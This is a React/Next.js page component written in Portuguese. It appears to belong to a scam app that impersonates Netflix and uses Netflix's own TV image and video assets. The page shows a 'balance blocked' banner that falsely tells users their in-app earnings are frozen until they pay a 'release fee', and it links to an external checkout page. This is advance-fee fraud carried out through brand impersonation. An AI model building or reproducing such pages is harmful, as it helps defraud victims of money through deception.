'use client';

import { Footer } from "@/components/footer";
import { Header } from "@/components/header";
import { useBalance } from "@/hook/useBalance";
import Banner from '@/assets/banner.png';
import Lock from '@/assets/lock.png';
import Image from "next/image";
import Link from "next/link";


export default function Upsell() {

  const { balance } = useBalance()
  return (
    <>

      <Header />

      <div className="relative flex flex-col md:flex-row flex-grow w-full">
        <Image alt="Banner" src={Banner} className="object-cover h-[40rem]" />
        <main className="absolute inset-x-0 top-24 md:top-48 flex flex-col text-white text-center px-4 items-center">

          <div className="max-w-[40rem] space-y-6">
          <div className="bg-red-700 text-white p-4 rounded-md text-xl font-bold w-full mt-6 flex items-center flex-col ">
             <Image src={Lock} className="w-20 h-20 mb-4" alt="Logo Pix" />
            SALDO BLOQUEADO!
          </div>
          <p className="mt-4 text-lg font-medium">
            O acesso ao seu saldo está temporariamente bloqueado. Para liberar o saldo de {balance} e acessar todas as funcionalidades do nosso aplicativo, é necessário efetuar o pagamento de uma taxa de liberação.
          </p>
          <p className="mt-4 text-lg font-medium"><strong>Importante:</strong> O pagamento desta taxa é indispensável para garantir a segurança da sua conta e liberar o acesso ao saldo bloqueado.</p>
        <Link href="https://pay.comprassite.com/checkout/9a93b519-a18d-4812-a62a-5513c97bd54d" >
        <button className= "bg-red-700 text-white font-bold py-3 px-6 rounded-md text-lg mt-6 botao-pulsante">
            Clique aqui para pagar a taxa e desbloquear seu saldo agora!
        </button>
          </Link>
          
          </div>
        </main>
      </div>


      <section className="border-b-8 border-gray-900 p-6">
        <div className="mx-auto text-white">
          <div className="flex flex-col md:flex-row items-center">
            <div className="md:w-1/2 flex flex-col justify-center items-center md:items-start text-center md:text-left px-4">
              <div className="max-w-[350px]">
                <h2 className="text-4xl md:text-[3.125rem] font-bold">Aproveite.</h2>
                <p className="mt-4 text-lg md:text-xl">
                  A Netflix que você adora agora colocando dinheiro no seu bolso
                </p>
              </div>
            </div>
            <div className="md:w-1/2 mt-8 md:mt-0 relative">
              <div className="relative z-10">
                <Image
                  src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/tv.png"
                  alt="TV"
                  width={640}
                  height={480}
                  className="w-full h-auto"
                />
              </div>
              <video
                autoPlay
                playsInline
                muted
                loop
                className="absolute top-[21%] left-[13.2%] max-w-[72.7%]"
              >
                <source
                  src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/video-tv-0819.m4v"
                  type="video/mp4"
                />
              </video>
            </div>
          </div>
        </div>
      </section>
      <Footer />
    </>
  );
}
